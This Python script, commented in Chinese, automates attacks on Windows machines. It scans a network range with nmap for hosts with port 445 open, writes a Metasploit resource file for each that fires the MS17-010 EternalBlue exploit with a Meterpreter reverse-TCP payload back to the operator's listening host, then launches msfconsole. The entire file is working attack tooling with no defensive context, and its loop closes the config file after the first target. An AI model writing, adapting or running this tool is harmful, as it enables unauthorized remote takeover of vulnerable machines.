
import os
import optparse
import sys
import nmap
def findTarget(Hosts):              #扫描网段范围内开放445端口的主机
    nmScan=nmap.PortScanner()
    nmScan.scan(Hosts,'445')
    targets=[]
    for t in nmScan.all_hosts():
        if nmScan[t].has_tcp(445):  #如果445端口提供了协议
            state=nmScan[t]['tcp'][445]['state']  #查看445端口的状态
            if state=='open':
                print ('[+]Found Target Host:'+t)
                targets.append(t)
    return targets         #返回开放445端口的主机列表
def confickerExploit(configFile,target,lhost):       #漏洞利用
    configFile.write('use exploit/windows/smb/ms17_010_eternalblue \n')  #漏洞利用代码
    configFile.write('set PAYLOAD windows/x64/meterpreter/reverse_tcp\n')
    configFile.write('set RHOST '+str(target)+'\n')              #设定参数
    configFile.write('set LHOST '+lhost+'\n')
    configFile.write('exploit -j -z\n')    #j选项是将所有连接的会话保持在后台 -z不与任务进行即时交换
def main():
    configFile=open('configure.rc','w')  #以写入方式打开配置文件
    usage='[-]Usage %prog -H <RHOSTS> -l/-L <LHOST> '
    parser=optparse.OptionParser(usage)
    parser.add_option('-H',dest='target',type='string',help='target host')           #目标主机
    parser.add_option('-l','-L',dest='lhost',type='string',help='listen address')    #我们的主机
    (options,args)=parser.parse_args()
    target=options.target
    lhost=options.lhost
    if (target==None)|(lhost==None):
        print (parser.usage)
        exit(0)
    targets=findTarget(options.target)           #寻找目标
    for target in targets:                       #逐个攻击
        confickerExploit(configFile,target,lhost)
        configFile.close()
        os.system('msfconsole -r configure.rc')  #启动metasploit并读取配置文件
if __name__=='__main__':

    main()
